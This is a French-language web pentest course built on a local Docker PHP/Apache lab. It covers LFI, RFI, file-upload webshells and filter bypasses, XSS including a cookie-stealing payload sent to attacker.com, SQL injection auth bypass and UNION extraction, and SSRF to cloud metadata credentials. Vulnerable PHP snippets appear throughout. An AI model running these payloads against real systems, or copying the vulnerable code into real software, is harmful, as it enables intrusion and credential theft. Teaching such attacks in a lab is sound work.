# Cours : Pentest Web - Docker PHP/Apache et vulnérabilités serveur

## Introduction

Cette section couvre :
- **Configuration Docker PHP/Apache** : Comprendre les options de déploiement
- **Vulnérabilités côté serveur** : Classification et impacts
- **Vecteurs d'attaque** : Injections, inclusions de fichiers, XSS, SSRF

***

## Partie 1 : Analyse du script run.sh - Docker PHP/Apache

### 1.1 Décomposition de la commande Docker

**Script run.sh** :
```bash
#!/bin/bash
docker run -d -p 8000:80 -v $(pwd):/var/www/html php:8.1-apache
```

**Explication détaillée des options** :

| Option | Valeur | Signification | Impact |
|--------|--------|---------------|--------|
| `-d` | - | Daemon mode | Exécution en arrière-plan |
| `-p` | `8000:80` | Port forwarding | Traffic du port 8000 (host) → port 80 (conteneur) |
| `-v` | `$(pwd):/var/www/html` | Volume mount | Répertoire actuel → Document root Apache |
| Image | `php:8.1-apache` | Image Docker | PHP 8.1 + serveur Apache intégré |

### 1.2 Explication détaillée

#### Option `-p 8000:80` : Port Forwarding

**Fonctionnement** :
```
Navigateur → http://localhost:8000 → Docker Engine → Port 80 du conteneur → Apache
```

**Avantage** : 
- Éviter les conflits si port 80 déjà utilisé sur la machine hôte
- Plusieurs conteneurs web sur différents ports (8000, 8001, 8002...)

**Test** :
```bash
# Lancer le conteneur
./run.sh

# Accéder à l'application
curl http://localhost:8000
# OU
http://localhost:8000 (navigateur)
```

#### Option `-v $(pwd):/var/www/html` : Volume Mount

**Fonctionnement** :
- `$(pwd)` : Répertoire actuel sur la machine hôte
- `:/var/www/html` : Document root Apache dans le conteneur
- Synchronisation bidirectionnelle en temps réel

**Avantage pour le développement** :
```bash
# Éditer index.php sur la machine hôte
echo "<?php phpinfo(); ?>" > index.php

# Changement immédiatement visible dans le conteneur
curl http://localhost:8000
# Affiche phpinfo()
```

**Cas d'usage pentest** :
- Tester rapidement des payloads PHP
- Modifier des scripts vulnérables pour analyse
- Déployer des webshells

#### Image `php:8.1-apache`

**Caractéristiques** :
- **PHP 8.1** : Interpréteur PHP préinstallé
- **Apache** : Serveur web intégré et préconfiguré
- **Tout-en-un** : Prêt à exécuter du code PHP immédiatement

**Alternative multi-conteneurs** (si besoin de MySQL) :
```bash
# Sans image combinée, il faudrait :
docker run -d php:8.1-fpm        # PHP-FPM
docker run -d nginx              # Serveur web
docker run -d mysql              # Base de données
# + Configuration manuelle des connexions

# Avec php:8.1-apache : une seule commande !
```

***

## Partie 2 : Vulnérabilités côté serveur - Vue d'ensemble

### 2.1 Classification des vulnérabilités

**Catégories principales** :

1. **Injections** : Insertion de code malveillant dans les entrées
2. **Inclusions de fichiers** : Manipulation des chemins de fichiers
3. **Upload exploits** : Exploitation de l'upload de fichiers
4. **Cross-Site Scripting (XSS)** : Injection de JavaScript malveillant
5. **Server-Side Request Forgery (SSRF)** : Manipulation des requêtes réseau

***

## Partie 3 : Local File Inclusion (LFI)

### 3.1 Définition et fonctionnement

**Local File Inclusion (LFI)** : Vulnérabilité permettant d'afficher des fichiers résidant sur le serveur en manipulant les paramètres d'inclusion de fichiers.

**Code PHP vulnérable** :
```php
<?php
$page = $_GET['page'];
include($page);
?>
```

**Exploitation** :
```
http://localhost:8000/index.php?page=../../etc/passwd
```

**Résultat** : Affiche le contenu de `/etc/passwd`

### 3.2 Fichiers sensibles cibles (Linux)

```
/etc/passwd           # Liste des utilisateurs
/etc/shadow           # Mots de passe hashés (si permissions)
/var/log/apache2/access.log  # Logs Apache
/var/www/html/config.php     # Credentials base de données
~/.ssh/id_rsa         # Clés SSH privées
/proc/self/environ    # Variables d'environnement
```

### 3.3 Techniques d'exploitation

**Path Traversal** :
```
?page=../../../../etc/passwd
```

**Null byte (PHP < 5.3.4)** :
```
?page=../../../../etc/passwd%00
```

**PHP Wrappers** :
```
?page=php://filter/convert.base64-encode/resource=config.php
?page=expect://whoami
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

***

## Partie 4 : Remote File Inclusion (RFI)

### 4.1 Définition

**Remote File Inclusion (RFI)** : Inclure des fichiers provenant de serveurs externes contrôlés par l'attaquant.

**Code vulnérable** :
```php
<?php
$page = $_GET['page'];
include($page);
?>
```

**Exploitation** :
```
http://localhost:8000/index.php?page=http://attacker.com/shell.php
```

**Fichier shell.php sur serveur attaquant** :
```php
<?php system($_GET['cmd']); ?>
```

### 4.2 Vecteurs d'attaque RFI

**1. Injection de webshell** :
```
?page=http://evil.com/backdoor.php
```

**2. JavaScript malveillant** :
```
?page=http://evil.com/malicious.js
```

**3. Fausse page de login (phishing)** :
```
?page=http://evil.com/fake-login.html
```

**4. Exploitation via log poisoning** :
```
# 1. Injecter du code PHP dans les logs via User-Agent
curl http://localhost:8000 -A "<?php system('whoami'); ?>"

# 2. Inclure le fichier de log
?page=/var/log/apache2/access.log
```

***

## Partie 5 : Upload File Exploits

### 5.1 Vulnérabilité d'upload non sécurisé

**Problème** : Le serveur accepte l'upload de fichiers exécutables (PHP, JSP, ASPX) sans validation.

**Code vulnérable** :
```php
<?php
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
?>
```

**Exploitation** :
```html
<!-- Upload d'un webshell -->
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
  <input type="submit">
</form>
```

**Fichier uploadé (shell.php)** :
```php
<?php system($_GET['cmd']); ?>
```

**Accès** :
```
http://localhost:8000/uploads/shell.php?cmd=whoami
```

### 5.2 Contournement des protections

**Bypass extension** :
```
shell.php.jpg       # Double extension
shell.php%00.jpg    # Null byte
shell.pHP           # Casse différente
shell.php5          # Extensions alternatives
.htaccess           # Redéfinir les extensions exécutables
```

**Bypass MIME type** :
```php
// Modifier Content-Type dans la requête
Content-Type: image/jpeg
```

**Bypass magic bytes** :
```php
// Ajouter des bytes d'image au début du fichier
GIF89a<?php system($_GET['cmd']); ?>
```

***

## Partie 6 : Cross-Site Scripting (XSS)

### 6.1 Définition

**XSS** : Injection de JavaScript malveillant exécuté dans le navigateur de la victime.

**Types de XSS** :
1. **Reflected XSS** : Payload dans l'URL, exécuté immédiatement
2. **Stored XSS** : Payload stocké en base de données, exécuté à chaque chargement
3. **DOM-based XSS** : Manipulation du DOM côté client

### 6.2 Reflected XSS

**Code vulnérable** :
```php
<?php
echo "Hello " . $_GET['name'];
?>
```

**Exploitation** :
```
http://localhost:8000/index.php?name=<script>alert('XSS')</script>
```

**Résultat** : Popup JavaScript s'affiche

**Payload avancé (vol de cookie)** :
```javascript
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```

### 6.3 Stored XSS

**Scénario** : Commentaire sur un blog

**Code vulnérable** :
```php
<?php
// Enregistrement
$comment = $_POST['comment'];
mysqli_query($conn, "INSERT INTO comments VALUES ('$comment')");

// Affichage
$result = mysqli_query($conn, "SELECT * FROM comments");
while ($row = mysqli_fetch_assoc($result)) {
    echo $row['comment'];  // Pas d'échappement !
}
?>
```

**Exploitation** :
```html
<script>
// Rediriger tous les visiteurs
window.location = 'http://attacker.com/phishing.html';
</script>
```

***

## Partie 7 : SQL Injection

### 7.1 Vulnérabilité de requête non sanitisée

**Code vulnérable** :
```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);
?>
```

**Exploitation (bypass authentication)** :
```
username: admin' OR '1'='1
password: anything

Requête finale :
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
```

**Résultat** : Connexion réussie sans connaître le mot de passe

### 7.2 Extraction de données (UNION-based)

**Exploitation** :
```sql
username: ' UNION SELECT 1,2,3,username,password FROM users--
password: 

Requête finale :
SELECT * FROM users WHERE username='' UNION SELECT 1,2,3,username,password FROM users--' AND password=''
```

**Résultat** : Affichage de tous les usernames et passwords

***

## Partie 8 : Server-Side Request Forgery (SSRF)

### 8.1 Définition

**SSRF** : Forcer le serveur à effectuer des requêtes réseau vers des ressources internes ou externes.

**Code vulnérable** :
```php
<?php
$url = $_GET['url'];
echo file_get_contents($url);
?>
```

### 8.2 Exploitation

**Accès au réseau interne** :
```
http://localhost:8000/fetch.php?url=http://192.168.1.10/admin
http://localhost:8000/fetch.php?url=http://internal-server/secrets.txt
```

**Accès aux métadonnées cloud (AWS)** :
```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Port scanning interne** :
```
?url=http://192.168.1.1:22
?url=http://192.168.1.1:3306
```

**Exploitation de services locaux** :
```
?url=http://localhost:6379/  # Redis
?url=http://localhost:9200/  # Elasticsearch
```

***

## Résumé : Points clés à retenir

1. **Docker `-p`** : Forward traffic (8000:80 = hôte:conteneur)
2. **Docker `-v`** : Mount volume (synchronisation répertoires)
3. **php:8.1-apache** : Image tout-en-un (PHP + Apache)
4. **LFI** : Afficher fichiers locaux (../../../../etc/passwd)
5. **RFI** : Inclure fichiers distants (http://evil.com/shell.php)
6. **Upload Exploits** : Uploader webshells exécutables
7. **XSS** : Injection JavaScript (vol de cookies, phishing)
8. **SQL Injection** : Requêtes non sanitisées (bypass auth, data extraction)
9. **SSRF** : Requêtes forcées vers réseau interne (métadonnées cloud, port scan)
